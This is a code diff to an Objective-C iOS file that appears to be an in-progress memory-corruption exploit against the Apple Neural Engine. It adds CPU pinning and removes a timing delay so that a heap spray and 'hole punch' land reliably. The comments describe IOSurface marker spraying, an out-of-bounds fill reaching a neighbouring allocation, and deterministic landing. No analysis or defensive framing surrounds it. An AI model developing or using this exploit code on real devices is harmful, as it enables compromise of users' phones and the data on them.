@@ -40,6 +40,8 @@
 #import <dlfcn.h>
 #import <fcntl.h>
 #import <mach/mach.h>
+#import <pthread.h>
+#import <mach/thread_policy.h>
 #import <stdarg.h>
 #import <string.h>
 #import <unistd.h>
@@ -58,7 +60,7 @@
 #define P073_OOB_FIRST    192u
 #define P073_ADDCHAIN     @"XVRC27_254in_1out_addchain"
 #define P073_SMALL        @"simple_1in1out"
-#define P073_HEADSTART_US 50000u
+#define P073_HEADSTART_US 0u   /* v9: 0ms headstart (265 MAF table - landing=deterministic record 192 at off 0) */
 #define P073_254_RETRY    3u     /* v3: bounded fill re-fire attempts (v2's 8ms -1
                                     looked like NO-FILL, dirty-ANE suspect: p099
                                     ran 90s before this tap on the same boot) */
@@ -119,6 +121,13 @@ static void p073_log(NSString *fmt, ...) {
 
 #pragma mark - IOSurface marker spray (D1)
 
+/* v9: CPU pinning (p088 law) — tag 2 = CPU_B; 254 fire + hole punch share it */
+static void p073_pin_cpu_b(void) {
+    thread_affinity_policy_data_t ap = { 2 };
+    thread_act_t t = pthread_mach_thread_np(pthread_self());
+    thread_policy_set(t, THREAD_AFFINITY_POLICY, (thread_policy_t)&ap,
+                      THREAD_AFFINITY_POLICY_COUNT);
+}
 static p073_iosCreate_t  s_iosCreate;
 static p073_iosGetID_t   s_iosGetID;
 static p073_iosBase_t    s_iosBase;
@@ -690,6 +699,7 @@ static NSURL *p073_model_url(NSString *name) {
         CFAbsoluteTime tKick = CFAbsoluteTimeGetCurrent();
         __block unsigned smallGood = 0, smallBad = 0;
         dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            p073_pin_cpu_b();
             /* single small (kept: the original v2/v3 census table) */
             tSmall0 = CFAbsoluteTimeGetCurrent();
             NSError *pErr = nil;
@@ -720,6 +730,7 @@ static NSURL *p073_model_url(NSString *name) {
            127, popped LIFO 127->...; a fresh small's table lands on the hole
            the 254's fill walks into (+0xc00 = +0x3e0 into the neighbor). */
         dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            p073_pin_cpu_b();
             NSMutableArray *holders = [NSMutableArray array];
             __block unsigned smallLoads = 0;
             for (uint32_t k = 0; k < P073_SMALL_BURST; k++) {
